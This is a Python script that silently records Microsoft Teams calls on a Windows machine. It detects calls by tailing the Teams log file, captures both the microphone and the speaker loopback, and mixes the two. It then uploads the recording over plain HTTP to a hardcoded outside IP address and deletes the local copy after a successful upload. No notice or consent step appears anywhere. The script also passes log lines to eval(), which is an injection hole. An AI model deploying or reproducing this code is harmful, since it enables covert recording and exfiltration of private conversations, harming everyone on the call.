import os
import ctypes
import threading
import pyaudio
import pyaudiowpatch as pyaudio1
import wave
import requests
from datetime import datetime
from pydub import AudioSegment

def get_logged_in_user_email():
    try:
        domain = os.environ['USERDOMAIN']
        username = os.environ['USERNAME']
        size = ctypes.c_ulong(0)
        ctypes.windll.kernel32.GetComputerNameExW(5, None, ctypes.byref(size))
        buffer = ctypes.create_unicode_buffer(size.value)
        ctypes.windll.kernel32.GetComputerNameExW(5, buffer, ctypes.byref(size))
        email = f"{username}@{buffer.value}"
        return email
    except Exception as e:
        print(f"Error: {e}")
        return None
class teamsRecorder:

    def __init__(self):
        # Get the active user's home directory path
        home_dir = os.path.expanduser("~")
        self.path = home_dir + "\AppData\Roaming\Microsoft\Teams\logs.txt"
        self.recording_in_progress = None
        self.start_record = None
        self.stop_record = None
        # self.pc_name = get_logged_in_user_email()
        self.user_name = None

        # Recording Parameters
        self.FORMAT = pyaudio.paInt16
        self.CHANNELS = 1
        self.RATE = 44100
        self.CHUNK = 1024
        self.default_speakers = None

        # MIc
        self.in_stream = None
        self.in_audio = None
        self.mic_frames = []

        # SPeaker
        self.out_stream = None
        self.out_audio = None
        self.speaker_frames = []

    def set_start_position(self, local_log_file):
        try:
            with open(self.path, "r+") as f:
                f.readlines()
                last_pos = f.tell()

            print(last_pos)

            with open(local_log_file, "w") as f:
                f.write(str(last_pos))
            return True
        except:
            return False

    def check_for_call(self):
        try:
            # Get Last Position from local log file
            with open('lastline.txt', "r") as f:
                last_pos = f.readlines()[0]
                last_pos = int(last_pos)

            # Get new lines
            with open(self.path, "r") as f:
                try:
                    f.seek(0, 2)
                    # getting the file handle position
                    last_pos_file = f.tell()
                    # f.seek(0)
                    if last_pos_file < last_pos:
                        s = f.seek(last_pos_file)
                    else:
                        s = f.seek(last_pos)
                    # print("seek",s)
                finally:
                    new_lines = f.readlines()
                    last_pos = f.tell()
                    # print("last",last_pos)

            # print("last pos",last_pos)

            with open('lastline.txt', "w") as f:
                f.write(str(last_pos))

            return True, new_lines
        except:
            print("error")
            return False, None

    def save_recording(self, frames):
        try:
            # Save the recorded audio as a WAV file
            now = datetime.now()
            filename = 'mic_' + now.strftime('%d_%m_%Y_%H_%M_%S') + '.wav'
            print(type(filename))

            wf = wave.open(filename, 'wb')
            wf.setnchannels(self.CHANNELS)
            wf.setsampwidth(self.in_audio.get_sample_size(self.FORMAT))
            wf.setframerate(self.RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            print("Recording saved")

            return True,filename
        except:
            print("Error saving file")
            return False,None
            pass

    def save_recording_speaker(self, frames):
        try:
            # Save the recorded audio as a WAV file
            now = datetime.now()
            filename = 'test_speaker_' + now.strftime('%d_%m_%Y_%H_%M_%S') + '.wav'
            print(filename)

            # Save the mixed audio to a single WAV file
            wavefile = wave.open(filename, 'wb')
            wavefile.setnchannels(self.default_speakers["maxInputChannels"])
            wavefile.setsampwidth(pyaudio1.get_sample_size(pyaudio1.paInt16))
            wavefile.setframerate(int(self.default_speakers["defaultSampleRate"]))
            wavefile.writeframes(b''.join(frames))
            wavefile.close()
            print("Recording saved1")
            return True,filename
        except:
            return False,None
            print("Error saving file1")
            pass

    def mix_and_send(self,mic_rec,spk_rec):

        f = mic_rec.split('_')[1:]

        fh = open('erpid.txt','r')
        self.user_name = fh.readlines()[0].strip()
        fh.close()
        filename = self.user_name
        for w in f:
            print(w)
            filename = filename + "_" + w

        print(mic_rec, spk_rec)
        print(filename)

        sound1 = AudioSegment.from_wav(mic_rec)
        sound2 = AudioSegment.from_wav(spk_rec)
        overlay = sound1.overlay(sound2, position=1000)
        # print("MIx done")
        overlay.export(filename, format="wav")
        print("MIx done")
        os.remove(mic_rec)
        os.remove(spk_rec)


        # url = 'http://182.180.54.158:10201/upload'
        url = 'http://182.180.54.158:10202/upload'
        sound_file_path = filename
        if os.path.exists(sound_file_path):
            f2 = open(sound_file_path, 'rb')
            data = {'file': f2}
            response = requests.post(url, files=data)
            print(response.text)
            f2.close()
            if response.text == "File saved":
                os.remove(sound_file_path)
            else:
                print("Error uploading ... saved locally")

    def set_call_status(self):
        # set starting
        status = self.set_start_position('lastline.txt')
        while not status:
            status = self.set_start_position('lastline.txt')
            print(status)

        print("Call thread started")
        while True:
            try:
                status, new_lines = self.check_for_call()
                if status:
                    # Process the new lines
                    for line in new_lines:
                        # Do something with each new line
                        if "ACTIVE_CALL_ID_ADDED" in line or "ACTIVE_CALL_ID_REMOVED" in line:
                            call = eval(line)
                            print(call)
                            if call['type'] == "ACTIVE_CALL_ID_ADDED":
                                self.recording_in_progress = True

                                # Mic
                                self.in_audio = pyaudio.PyAudio()
                                # Open the audio stream
                                self.in_stream = self.in_audio.open(format=self.FORMAT, channels=self.CHANNELS,
                                                                    rate=self.RATE, input=True,
                                                                    frames_per_buffer=self.CHUNK)

                                # Speaker
                                self.out_audio = pyaudio1.PyAudio()
                                wasapi_info = self.out_audio.get_host_api_info_by_type(pyaudio1.paWASAPI)
                                default_speakers = self.out_audio.get_device_info_by_index(
                                    wasapi_info["defaultOutputDevice"])
                                if not default_speakers["isLoopbackDevice"]:
                                    for loopback in self.out_audio.get_loopback_device_info_generator():
                                        """
                                        Try to find loopback device with same name(and [Loopback suffix]).
                                        Unfortunately, this is the most adequate way at the moment.
                                        """
                                        if default_speakers["name"] in loopback["name"]:
                                            default_speakers = loopback
                                            break
                                    else:
                                        print("Default device not found")

                                self.default_speakers = default_speakers
                                self.out_stream = self.out_audio.open(format=pyaudio1.paInt16,
                                                                      channels=default_speakers["maxInputChannels"],
                                                                      rate=int(default_speakers["defaultSampleRate"]),
                                                                      frames_per_buffer=pyaudio1.get_sample_size(
                                                                          pyaudio.paInt16),
                                                                      input=True,
                                                                      input_device_index=default_speakers["index"],
                                                                      )
                                print("Call started")
                            else:
                                self.recording_in_progress = None

                                # end mic
                                self.in_stream.stop_stream()
                                self.in_stream.close()
                                self.in_audio.terminate()

                                # end speaker
                                self.out_stream.stop_stream()
                                self.out_stream.close()
                                self.out_audio.terminate()

                                print("Call Ended")
                                mic_status,mic_rec = self.save_recording(self.mic_frames)
                                spk_status,spk_rec = self.save_recording_speaker(self.speaker_frames)
                                self.mic_frames = []
                                self.speaker_frames = []

                                if mic_status and spk_status:
                                    th = threading.Thread(target=self.mix_and_send,args=(mic_rec,spk_rec,))
                                    th.start()

            except:
                print("error2")
                pass

    def start_recording_mic(self):
        print("recording thread started")
        while True:
            try:
                if self.recording_in_progress:
                    print("recording")
                    data = self.in_stream.read(self.CHUNK)
                    self.mic_frames.append(data)
            except:
                pass

    def start_recording_speaker(self):
        print("recording thread started")
        while True:
            try:
                if self.recording_in_progress:
                    data = self.out_stream.read(self.CHUNK)
                    self.speaker_frames.append(data)
            except:
                pass

    def start(self):
        t2 = threading.Thread(target=self.start_recording_mic)
        t2.start()

        t3 = threading.Thread(target=self.start_recording_speaker)
        t3.start()

        t1 = threading.Thread(target=self.set_call_status)
        t1.start()


t = teamsRecorder()
t.start()
